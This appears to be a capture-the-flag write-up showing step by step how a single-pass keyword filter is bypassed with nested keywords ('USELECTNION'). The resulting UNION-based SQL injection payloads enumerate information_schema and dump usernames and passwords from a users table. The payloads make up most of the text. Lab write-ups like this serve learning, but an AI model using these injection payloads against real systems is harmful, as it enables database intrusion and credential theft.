Seems that the keywords of SELECT and UNION are filtered out

However injection is possible still like so:
' OR ''='

Let's try adding characters which may bypass the filtering
'+OR ''='+U%00NION+SE%00LECT+*+FROM+search_engine+WHERE+title+LIKE+'

Doesn't work, let's make sure that  It's not a query fault but indeed
the null breaking it,
' O%00R ''='
in the URL doesn't work...

After thinking about it for a while, noticed the following
vulnerability in the preg_replace:
It filters only one iteration on the input...
first removing "union" then "select"

Thus
q=USELECTNION+SSELECTELECT Would be filterd as follows:
U[SELECT]NION S[SELECT]ELECT -> UNION SELECT

Now we can craft a query like so:
?q=a'+USELECTNION+USELECTNION+SESELECTLECT+*+FROM+search_engine+WHERE+TITLE+LIKE+'a

By adding another query for everything in the same method between these two
we can prove that indeed this is our running query

However, now we also want to list all of our databases
in order to find where the flag is located

a'+UselectNION+SselectELECT+*+FROM+search_engine+FULL+JOIN+information_schema.schemata+ON+1=1+USELECTNION+SESELECTLECT+*+FROM+search_engine+WHERE+title+LIKE+'

Using the following as a base injection
a' UselectNION SELECselectT * FROM search_engine WHERE 1=1 OR ''='a

a' UselectNION SELECselectT * FROM search_engine FULL JOIN information_schema.schemata ON search_engine.title=1 WHERE 1=1 OR ''='a

Doesn't seem to be working, it indeed displays only title and such, let's try something different:

We'll see if wecan use aliases
a' UselectNION SELECselectT title AS title, title AS link, title AS description FROM search_engine WHERE 1=1 OR ''='a
Nice..
Now maybe this way we can obtain the schema_names, however we may also not be priveleged to do so
a' UselectNION SELECselectT schema_name AS title, schema_name AS link, schema_name AS description FROM information_schema.schemata WHERE 1=1 OR ''='a
Nope..

Indeed it seems we don't have the required priveleges..
Let's try something else, maybe obtaining column count to see whether there is more information in the original search_engine DB
a' UselectNION SELECselectT flag AS title, title AS link, title AS description FROM search_engine WHERE 1=1 OR ''='a

SILLY ME! finally remembered that actually we should have permissions for viewing the INFORMATION_SCHEMA_SCHEMATA table!
The issue was attempting to continue parsing the like statements afterwards, so we just needed to pad it with another valid query UNION

a' UselectNION SselectELECT SCHEMA_NAME AS title, SCHEMA_NAME AS link, SCHEMA_NAME AS description FROM INFORMATION_SCHEMA.SCHEMATA UselectNION SselectELECT * FROM search_engine WHERE ''='a

We now see that the databases we have access to are
    information_schema
    level3

Let's obtain now the column information:
a' UselectNION SselectELECT COLUMN_NAME AS title, ORDINAL_POSITION AS link, DATA_TYPE AS description FROM INFORMATION_SCHEMA.COLUMNS UselectNION SselectELECT * FROM search_engine WHERE ''='a

There seems to be a lot of information, probably mostly from information_shcema, howver note "username, password" columns :)

Let's specifically see if there are any interesting tables we might want:
a' UselectNION SselectELECT TABLE_NAME AS title, TABLE_TYPE AS link, ENGINE AS description FROM INFORMATION_SCHEMA.TABLES UselectNION SselectELECT * FROM search_engine WHERE ''='a

Other than all the defaults, there are the followinf interesting tables:
    search_engine
    users

Now we could've gotten this information better, let's list the columns again but now instead of the ORDINAL_POSITION let's get the TABLE_NAME which 
should also be defined fro SCHEME_INFORMATION.COLUMNS

a' UselectNION SselectELECT COLUMN_NAME AS title, TABLE_NAME AS link, DATA_TYPE AS description FROM INFORMATION_SCHEMA.COLUMNS UselectNION SselectELECT * FROM search_engine WHERE ''='a

We see that theser are in fact the tables and their values:
    search_engine (title, link, description)
    users (username, password)

Let's now just obtain all the credentials
a' UselectNION SselectELECT username as title, username as link, password as description FROM users UselectNION SselectELECT * FROM search_engine WHERE ''='a

And we get the nice entry:

Administrator
FLAG-dad50ccc5b4e578f4ac050cd9fc39175
